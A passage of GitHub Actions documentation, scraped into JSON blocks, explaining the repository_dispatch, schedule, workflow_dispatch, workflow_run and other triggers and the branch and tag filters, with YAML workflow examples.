        "text": "You can use the GitHub API to trigger a webhook event calledrepository_dispatchwhen you want to trigger a workflow for activity that happens outside of GitHub. For more information, seeREST API endpoints for repositories."
      },
      {
        "type": "paragraph",
        "text": "When you make a request to create arepository_dispatchevent, you must specify anevent_typeto describe the activity type. By default, allrepository_dispatchactivity types trigger a workflow to run. You can use thetypeskeyword to limit your workflow to run when a specificevent_typevalue is sent in therepository_dispatchwebhook payload."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  repository_dispatch:\n    types: [test_result]"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Theevent_typevalue is limited to 100 characters."
      },
      {
        "type": "paragraph",
        "text": "Any data that you send through theclient_payloadparameter will be available in thegithub.eventcontext in your workflow. For example, if you send this request body when you create a repository dispatch event:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"event_type\": \"test_result\",\n  \"client_payload\": {\n    \"passed\": false,\n    \"message\": \"Error: timeout\"\n  }\n}"
      },
      {
        "type": "paragraph",
        "text": "then you can access the payload in a workflow like this:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  repository_dispatch:\n    types: [test_result]\n\njobs:\n  run_if_failure:\n    if: ${{ !github.event.client_payload.passed }}\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          MESSAGE: ${{ github.event.client_payload.message }}\n        run: echo $MESSAGE"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The maximum number of top-level properties inclient_payloadis 10.",
          "The payload can contain a maximum of 65,535 characters."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "schedule"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thescheduleevent can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.",
          "This event will only trigger a workflow run if the workflow file is on the default branch.",
          "Scheduled workflows will only run on the default branch.",
          "In a public repository, scheduled workflows are automatically disabled when no repository activity has occurred in 60 days. For information on re-enabling a disabled workflow, seeDisabling and enabling a workflow.",
          "For an enterprise with Enterprise Managed Users, scheduled workflows will not run if the lastactorassociated with the scheduled workflow has been deprovisioned (and therefore become suspended) by the Enterprise Managed User identity provider (IdP). However, if the lastactorEnterprise Managed User has not been deprovisioned by the IdP, and has only been removed as a member from a given organization in the enterprise, scheduled workflows will still run with that user set as theactor. Similarly, for an enterprise without Enterprise Managed Users, removing a user from an organization will not prevent scheduled workflows which had that user as theiractorfrom running. Essentially, triggering a scheduled workflow requires that the status of theactoruser account associated with the workflow is currently active (i.e. not suspended or deleted). Thus, theuser account'sstatus, in both Enterprise Managed User and non-Enterprise Managed User scenarios, is what's important,notthe user'smembership statusin the organization where the scheduled workflow is located.",
          "Certain repository events change theactorassociated with the workflow. For example, a user who changes the default branch of the repository, which changes the branch on which scheduled workflows run, becomesactorfor those scheduled workflows.",
          "For a deactivated scheduled workflow, if a user withwritepermissions to the repository makes a commit that changes thecronschedule on the workflow, the workflow will be reactivated, and that user will become theactorassociated with any workflow runs. Note that, in this situation, the workflow is not reactivated by any change to the workflow file; you must alter thecronvalue in the workflow and commit this change.Example:on:schedule:-cron:\"15 4,5 * * *\"# <=== Change this value"
        ]
      },
      {
        "type": "paragraph",
        "text": "Thescheduleevent allows you to trigger a workflow at a scheduled time."
      },
      {
        "type": "paragraph",
        "text": "You can schedule a workflow to run at specific UTC times usingPOSIX cron syntax. Scheduled workflows run on the latest commit on the default or base branch. The shortest interval you can run scheduled workflows is once every 5 minutes."
      },
      {
        "type": "paragraph",
        "text": "This example triggers the workflow every day at 5:30 and 17:30 UTC:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  schedule:\n    # * is a special character in YAML so you have to quote this string\n    - cron:  '30 5,17 * * *'"
      },
      {
        "type": "paragraph",
        "text": "A single workflow can be triggered by multiplescheduleevents. You can access the schedule event that triggered the workflow through thegithub.event.schedulecontext. This example triggers the workflow to run at 5:30 UTC every Monday-Thursday, but skips theNot on Monday or Wednesdaystep on Monday and Wednesday."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  schedule:\n    - cron: '30 5 * * 1,3'\n    - cron: '30 5 * * 2,4'\n\njobs:\n  test_schedule:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Not on Monday or Wednesday\n        if: github.event.schedule != '30 5 * * 1,3'\n        run: echo \"This step will be skipped on Monday and Wednesday\"\n      - name: Every time\n        run: echo \"This step will always run\""
      },
      {
        "type": "paragraph",
        "text": "Cron syntax has five fields separated by a space, and each field represents a unit of time."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "┌───────────── minute (0 - 59)\n│ ┌───────────── hour (0 - 23)\n│ │ ┌───────────── day of the month (1 - 31)\n│ │ │ ┌───────────── month (1 - 12 or JAN-DEC)\n│ │ │ │ ┌───────────── day of the week (0 - 6 or SUN-SAT)\n│ │ │ │ │\n│ │ │ │ │\n│ │ │ │ │\n* * * * *"
      },
      {
        "type": "paragraph",
        "text": "You can use these operators in any of the five fields:"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions does not support the non-standard syntax@yearly,@monthly,@weekly,@daily,@hourly, and@reboot."
      },
      {
        "type": "paragraph",
        "text": "You can usecrontab guruto help generate your cron syntax and confirm what time it will run. To help you get started, there is also a list ofcrontab guru examples."
      },
      {
        "type": "paragraph",
        "text": "Notifications for scheduled workflows are sent to the user who last modified the cron syntax in the workflow file. For more information, seeNotifications for workflow runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "status"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when the status of a Git commit changes. For example, commits can be marked aserror,failure,pending, orsuccess. If you want to provide more details about the status change, you may want to use thecheck_runevent. For information about the commit status APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for commits."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thestatusevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  status"
      },
      {
        "type": "paragraph",
        "text": "If you want to run a job in your workflow based on the new commit state, you can use thegithub.event.statecontext. For example, the following workflow triggers when a commit status changes, but theif_error_or_failurejob only runs if the new commit state iserrororfailure."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  status\njobs:\n  if_error_or_failure:\n    runs-on: ubuntu-latest\n    if: >-\n      github.event.state == 'error' ||\n      github.event.state == 'failure'\n    steps:\n      - env:\n          DESCRIPTION: ${{ github.event.description }}\n        run: |\n          echo The status is error or failed: $DESCRIPTION"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "watch"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. Although only thestartedactivity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when the workflow's repository is starred. For information about the pull request APIs, seeMutationsin the GraphQL API documentation orREST API endpoints for starring."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when someone stars a repository, which is thestartedactivity type for a watch event."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  watch:\n    types: [started]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "workflow_call"
      },
      {
        "type": "paragraph",
        "text": "workflow_callis used to indicate that a workflow can be called by another workflow. When a workflow is triggered with theworkflow_callevent, the event payload in the called workflow is the same event payload from the calling workflow. For more information see,Reusing workflows."
      },
      {
        "type": "paragraph",
        "text": "The example below only runs the workflow when it's called from another workflow:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: workflow_call"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "workflow_dispatch"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "To enable a workflow to be triggered manually, you need to configure theworkflow_dispatchevent. You can manually trigger a workflow run using the GitHub API, GitHub CLI, or the GitHub UI. For more information, seeManually running a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: workflow_dispatch"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Providing inputs"
      },
      {
        "type": "paragraph",
        "text": "You can configure custom-defined input properties, default input values, and required inputs for the event directly in your workflow. When you trigger the event, you can provide therefand anyinputs. When the workflow runs, you can access the input values in theinputscontext. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The workflow will also receive the inputs in thegithub.event.inputscontext. The information in theinputscontext andgithub.event.inputscontext is identical except that theinputscontext preserves Boolean values as Booleans instead of converting them to strings. Thechoicetype resolves to a string and is a single selectable option.",
          "The maximum number of top-level properties forinputsis 10.",
          "The maximum payload forinputsis 65,535 characters."
        ]
      },
      {
        "type": "paragraph",
        "text": "This example defines inputs calledlogLevel,tags, andenvironment. You pass values for these inputs to the workflow when you run it. This workflow then prints the values to the log, using theinputs.logLevel,inputs.tags, andinputs.environmentcontext properties."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n        - info\n        - warning\n        - debug\n      tags:\n        description: 'Test scenario tags'\n        required: false\n        type: boolean\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n\njobs:\n  log-the-inputs:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo \"Log level: $LEVEL\"\n          echo \"Tags: $TAGS\"\n          echo \"Environment: $ENVIRONMENT\"\n        env:\n          LEVEL: ${{ inputs.logLevel }}\n          TAGS: ${{ inputs.tags }}\n          ENVIRONMENT: ${{ inputs.environment }}"
      },
      {
        "type": "paragraph",
        "text": "If you run this workflow from a browser you must enter values for the required inputs manually before the workflow will run."
      },
      {
        "type": "paragraph",
        "text": "You can also pass inputs when you run a workflow from a script, or by using GitHub CLI. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh workflow run run-tests.yml -f logLevel=warning -f tags=false -f environment=staging"
      },
      {
        "type": "paragraph",
        "text": "For more information, see the GitHub CLI information inManually running a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "workflow_run"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. Therequestedactivity type does not occur when a workflow is re-run. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "You can't useworkflow_runto chain together more than three levels of workflows. For example, if you attempt to trigger five workflows (namedBtoF) to run sequentially after an initial workflowAhas run (that is:A→B→C→D→E→F), workflowsEandFwill not be run."
      },
      {
        "type": "paragraph",
        "text": "This event occurs when a workflow run is requested or completed. It allows you to execute a workflow based on execution or completion of another workflow. The workflow started by theworkflow_runevent is able to access secrets and write tokens, even if the previous workflow was not. This is useful in cases where the previous workflow is intentionally not privileged, but you need to take a privileged action in a later workflow."
      },
      {
        "type": "paragraph",
        "text": "In this example, a workflow is configured to run after the separate \"Run Tests\" workflow completes."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [Run Tests]\n    types:\n      - completed"
      },
      {
        "type": "paragraph",
        "text": "If you specify multipleworkflowsfor theworkflow_runevent, only one of the workflows needs to run. For example, a workflow with the following trigger will run whenever the \"Staging\" workflow or the \"Lab\" workflow completes."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [Staging, Lab]\n    types:\n      - completed"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running a workflow based on the conclusion of another workflow"
      },
      {
        "type": "paragraph",
        "text": "A workflow run is triggered regardless of the conclusion of the previous workflow. If you want to run a job or step based on the result of the triggering workflow, you can use a conditional with thegithub.event.workflow_run.conclusionproperty. For example, this workflow will run whenever a workflow named \"Build\" completes, but theon-successjob will only run if the \"Build\" workflow succeeded, and theon-failurejob will only run if the \"Build\" workflow failed:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\n\njobs:\n  on-success:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'success' }}\n    steps:\n      - run: echo 'The triggering workflow passed'\n  on-failure:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.workflow_run.conclusion == 'failure' }}\n    steps:\n      - run: echo 'The triggering workflow failed'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limiting your workflow to run based on branches"
      },
      {
        "type": "paragraph",
        "text": "You can use thebranchesorbranches-ignorefilter to specify what branches the triggering workflow must run on in order to trigger your workflow. For more information, seeWorkflow syntax for GitHub Actions. For example, a workflow with the following trigger will only run when the workflow namedBuildruns on a branch namedcanary."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_run:\n    workflows: [Build]\n    types: [requested]\n    branches: [canary]"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using data from the triggering workflow"
      },
      {
        "type": "paragraph",
        "text": "You can access theworkflow_runevent payloadthat corresponds to the workflow that triggered your workflow. For example, if your triggering workflow generates artifacts, a workflow triggered with theworkflow_runevent can access these artifacts."
      },
      {
        "type": "paragraph",
        "text": "The following workflow uploads data as an artifact. (In this simplified example, the data is the pull request number.)"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Upload data\n\non:\n  pull_request:\n\njobs:\n  upload:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Save PR number\n        env:\n          PR_NUMBER: ${{ github.event.number }}\n        run: |\n          mkdir -p ./pr\n          echo $PR_NUMBER > ./pr/pr_number\n      - uses: actions/upload-artifact@v4\n        with:\n          name: pr_number\n          path: pr/"
      },
      {
        "type": "paragraph",
        "text": "When a run of the above workflow completes, it triggers a run of the following workflow. The following workflow uses thegithub.event.workflow_runcontext and the GitHub REST API to download the artifact that was uploaded by the above workflow, unzips the downloaded artifact, and comments on the pull request whose number was uploaded as an artifact."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Use the data\n\non:\n  workflow_run:\n    workflows: [Upload data]\n    types:\n      - completed\n\njobs:\n  download:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Download artifact'\n        uses: actions/github-script@v7\n        with:\n          script: |\n            let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               run_id: context.payload.workflow_run.id,\n            });\n            let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {\n              return artifact.name == \"pr_number\"\n            })[0];\n            let download = await github.rest.actions.downloadArtifact({\n               owner: context.repo.owner,\n               repo: context.repo.repo,\n               artifact_id: matchArtifact.id,\n               archive_format: 'zip',\n            });\n            const fs = require('fs');\n            const path = require('path');\n            const temp = '${{ runner.temp }}/artifacts';\n            if (!fs.existsSync(temp)){\n              fs.mkdirSync(temp);\n            }\n            fs.writeFileSync(path.join(temp, 'pr_number.zip'), Buffer.from(download.data));\n\n      - name: 'Unzip artifact'\n        run: unzip pr_number.zip -d \"${{ runner.temp }}/artifacts\"\n\n      - name: 'Comment on PR'\n        uses: actions/github-script@v7\n        with:\n          github-token: ${{ secrets.GITHUB_TOKEN }}\n          script: |\n            const fs = require('fs');\n            const path = require('path');\n            const temp = '${{ runner.temp }}/artifacts';\n            const issue_number = Number(fs.readFileSync(path.join(temp, 'pr_number')));\n            await github.rest.issues.createComment({\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              issue_number: issue_number,\n              body: 'Thank you for the PR!'\n            });"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflow triggers"
      },
      {
        "type": "paragraph",
        "text": "Workflow triggers are events that cause a workflow to run. These events can be:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Events that occur in your workflow's repository",
          "Events that occur outside of GitHub and trigger arepository_dispatchevent on GitHub",
          "Scheduled times",
          "Manual"
        ]
      },
      {
        "type": "paragraph",
        "text": "For example, you can configure your workflow to run when a push is made to the default branch of your repository, when a release is created, or when an issue is opened."
      },
      {
        "type": "paragraph",
        "text": "Workflow triggers are defined with theonkey. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "The following steps occur to trigger a workflow run:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "An event occurs on your repository. The event has an associated commit SHA and Git ref.",
          "GitHub searches the.github/workflowsdirectory in the root of your repository for workflow files that are present in the associated commit SHA or Git ref of the event.",
          "A workflow run is triggered for any workflows that haveon:values that match the triggering event. Some events also require the workflow file to be present on the default branch of the repository in order to run.Each workflow run will use the version of the workflow that is present in the associated commit SHA or Git ref of the event. When a workflow runs, GitHub sets theGITHUB_SHA(commit SHA) andGITHUB_REF(Git ref) environment variables in the runner environment. For more information, seeStore information in variables."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Triggering a workflow from a workflow"
      },
      {
        "type": "paragraph",
        "text": "When you use the repository'sGITHUB_TOKENto perform tasks, events triggered by theGITHUB_TOKEN, with the exception ofworkflow_dispatchandrepository_dispatch, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository'sGITHUB_TOKEN, a new workflow will not run even when the repository contains a workflow configured to run whenpushevents occur. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "If you do want to trigger a workflow from within a workflow run, you can use a GitHub App installation access token or a personal access token instead ofGITHUB_TOKENto trigger events that require a token."
      },
      {
        "type": "paragraph",
        "text": "If you use a GitHub App, you'll need to create a GitHub App and store the app ID and private key as secrets. For more information, seeMaking authenticated API requests with a GitHub App in a GitHub Actions workflow. If you use a personal access token, you'll need to create a personal access token and store it as a secret. For more information about creating a personal access token, seeManaging your personal access tokens. For more information about storing secrets, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "To minimize your GitHub Actions usage costs, ensure that you don't create recursive or unintended workflow runs."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow uses a personal access token (stored as a secret calledMY_TOKEN) to add a label to an issue via GitHub CLI. Any workflows that run when a label is added will run once this step is performed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types:\n      - opened\n\njobs:\n  label_issue:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GH_TOKEN: ${{ secrets.MY_TOKEN }}\n          ISSUE_URL: ${{ github.event.issue.html_url }}\n        run: |\n          gh issue edit $ISSUE_URL --add-label \"triage\""
      },
      {
        "type": "paragraph",
        "text": "Conversely, the following workflow usesGITHUB_TOKENto add a label to an issue. It will not trigger any workflows that run when a label is added."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types:\n      - opened\n\njobs:\n  label_issue:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          ISSUE_URL: ${{ github.event.issue.html_url }}\n        run: |\n          gh issue edit $ISSUE_URL --add-label \"triage\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using events to trigger workflows"
      },
      {
        "type": "paragraph",
        "text": "Use theonkey to specify what events trigger your workflow. For more information about events you can use, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a single event"
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the followingonvalue will run when a push is made to any branch in the workflow's repository:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: push"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using multiple events"
      },
      {
        "type": "paragraph",
        "text": "You can specify a single event or multiple events. For example, a workflow with the followingonvalue will run when a push is made to any branch in the repository or when someone forks the repository:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push, fork]"
      },
      {
        "type": "paragraph",
        "text": "If you specify multiple events, only one of those events needs to occur to trigger your workflow. If multiple triggering events for your workflow occur at the same time, multiple workflow runs will be triggered."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using activity types and filters with multiple events"
      },
      {
        "type": "paragraph",
        "text": "You can use activity types and filters to further control when your workflow will run. For more information, seeUsing event activity typesandUsing filters. If you specify activity types or filters for an event and your workflow triggers on multiple events, you must configure each event separately. You must append a colon (:) to all events, including events without configuration."
      },
      {
        "type": "paragraph",
        "text": "For example, a workflow with the followingonvalue will run when:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A label is created",
          "A push is made to themainbranch in the repository",
          "A push is made to a GitHub Pages-enabled branch"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  label:\n    types:\n      - created\n  push:\n    branches:\n      - main\n  page_build:"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using event activity types"
      },
      {
        "type": "paragraph",
        "text": "Some events have activity types that give you more control over when your workflow should run. Useon.<event_name>.typesto define the type of event activity that will trigger a workflow run."
      },
      {
        "type": "paragraph",
        "text": "For example, theissue_commentevent has thecreated,edited, anddeletedactivity types. If your workflow triggers on thelabelevent, it will run whenever a label is created, edited, or deleted. If you specify thecreatedactivity type for thelabelevent, your workflow will run when a label is created but not when a label is edited or deleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  label:\n    types:\n      - created"
      },
      {
        "type": "paragraph",
        "text": "If you specify multiple activity types, only one of those event activity types needs to occur to trigger your workflow. If multiple triggering event activity types for your workflow occur at the same time, multiple workflow runs will be triggered. For example, the following workflow triggers when an issue is opened or labeled. If an issue with two labels is opened, three workflow runs will start: one for the issue opened event and two for the two issue labeled events."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types:\n      - opened\n      - labeled"
      },
      {
        "type": "paragraph",
        "text": "For more information about each event and their activity types, seeEvents that trigger workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using filters"
      },
      {
        "type": "paragraph",
        "text": "Some events have filters that give you more control over when your workflow should run."
      },
      {
        "type": "paragraph",
        "text": "For example, thepushevent has abranchesfilter that causes your workflow to run only when a push to a branch that matches thebranchesfilter occurs, instead of when any push occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n      - 'releases/**'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using filters to target specific branches for pull request events"
      },
      {
        "type": "paragraph",
        "text": "When using thepull_requestandpull_request_targetevents, you can configure a workflow to run only for pull requests that target specific branches."
      },
      {
        "type": "paragraph",
        "text": "Use thebranchesfilter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use thebranches-ignorefilter when you only want to exclude branch name patterns. You cannot use both thebranchesandbranches-ignorefilters for the same event in a workflow."
      },
      {
        "type": "paragraph",
        "text": "If you define bothbranches/branches-ignoreandpaths/paths-ignore, the workflow will only run when both filters are satisfied."
      },
      {
        "type": "paragraph",
        "text": "Thebranchesandbranches-ignorekeywords accept glob patterns that use characters like*,**,+,?,!and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need to escape each of these special characters with\\. For more information about glob patterns, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Including branches"
      },
      {
        "type": "paragraph",
        "text": "The patterns defined inbranchesare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apull_requestevent for a pull request targeting:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmain(refs/heads/main)",
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name starts withreleases/, likereleases/10(refs/heads/releases/10)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "If a workflow is skipped due to branch filtering,path filtering, or acommit message, then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Excluding branches"
      },
      {
        "type": "paragraph",
        "text": "When a pattern matches thebranches-ignorepattern, the workflow will not run. The patterns defined inbranches-ignoreare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apull_requestevent unless the pull request is targeting:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name matchesreleases/**-alpha, likereleases/beta/3-alpha(refs/heads/releases/beta/3-alpha)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Including and excluding branches"
      },
      {
        "type": "paragraph",
        "text": "You cannot usebranchesandbranches-ignoreto filter the same event in a single workflow. If you want to both include and exclude branch patterns for a single event, use thebranchesfilter along with the!character to indicate which branches should be excluded."
      },
      {
        "type": "paragraph",
        "text": "If you define a branch with the!character, you must also define at least one branch without the!character. If you only want to exclude branches, usebranches-ignoreinstead."
      },
      {
        "type": "paragraph",
        "text": "The order that you define patterns matters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A matching negative pattern (prefixed with!) after a positive match will exclude the Git ref.",
          "A matching positive pattern after a negative match will include the Git ref again."
        ]
      },
      {
        "type": "paragraph",
        "text": "The following workflow will run onpull_requestevents for pull requests that targetreleases/10orreleases/beta/mona, but not for pull requests that targetreleases/10-alphaorreleases/beta/3-alphabecause the negative pattern!releases/**-alphafollows the positive pattern."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using filters to target specific branches or tags for push events"
      },
      {
        "type": "paragraph",
        "text": "When using thepushevent, you can configure a workflow to run on specific branches or tags."
      },
      {
        "type": "paragraph",
        "text": "Use thebranchesfilter when you want to include branch name patterns or when you want to both include and exclude branch names patterns. Use thebranches-ignorefilter when you only want to exclude branch name patterns. You cannot use both thebranchesandbranches-ignorefilters for the same event in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Use thetagsfilter when you want to include tag name patterns or when you want to both include and exclude tag names patterns. Use thetags-ignorefilter when you only want to exclude tag name patterns. You cannot use both thetagsandtags-ignorefilters for the same event in a workflow."
      },
      {
        "type": "paragraph",
        "text": "If you define onlytags/tags-ignoreor onlybranches/branches-ignore, the workflow won't run for events affecting the undefined Git ref. If you define neithertags/tags-ignoreorbranches/branches-ignore, the workflow will run for events affecting either branches or tags. If you define bothbranches/branches-ignoreandpaths/paths-ignore, the workflow will only run when both filters are satisfied."
      },
      {
        "type": "paragraph",
        "text": "Thebranches,branches-ignore,tags, andtags-ignorekeywords accept glob patterns that use characters like*,**,+,?,!and others to match more than one branch or tag name. If a name contains any of these characters and you want a literal match, you need toescapeeach of these special characters with\\. For more information about glob patterns, see theWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Including branches and tags"
      },
      {
        "type": "paragraph",
        "text": "The patterns defined inbranchesandtagsare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apushevent to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmain(refs/heads/main)",
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name starts withreleases/, likereleases/10(refs/heads/releases/10)",
          "A tag namedv2(refs/tags/v2)",
          "A tag whose name starts withv1., likev1.9.1(refs/tags/v1.9.1)"
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'\n    # Sequence of patterns matched against refs/tags\n    tags:\n      - v2\n      - v1.*"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example: Excluding branches and tags"
      },
      {
        "type": "paragraph",
        "text": "When a pattern matches thebranches-ignoreortags-ignorepattern, the workflow will not run. The patterns defined inbranchesandtagsare evaluated against the Git ref's name. For example, the following workflow would run whenever there is apushevent, unless thepushevent is to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A branch namedmona/octocat(refs/heads/mona/octocat)",
          "A branch whose name matchesreleases/**-alpha, likereleases/beta/3-alpha(refs/heads/releases/beta/3-alpha)",
          "A tag namedv2(refs/tags/v2)",
          "A tag whose name starts withv1., likev1.9(refs/tags/v1.9)"
        ]
      },
      {
